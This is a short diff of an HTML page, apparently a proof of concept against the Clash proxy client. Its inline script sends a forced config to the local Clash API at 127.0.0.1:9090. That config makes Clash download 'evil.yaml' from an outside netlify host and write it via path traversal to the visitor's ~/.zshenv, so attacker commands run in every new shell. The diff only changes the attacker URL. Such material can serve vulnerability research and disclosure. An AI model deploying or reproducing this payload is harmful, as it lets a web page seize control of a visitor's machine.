@@ -13,7 +13,7 @@
     <p>
         <script>        
             const data = {
-                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'https://clash.netlify.app/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
+                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'https://shimmering-kitsune-6b2934.netlify.app/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
             };
             fetch('http://127.0.0.1:9090/configs?force=true', {
                 method: 'PUT',
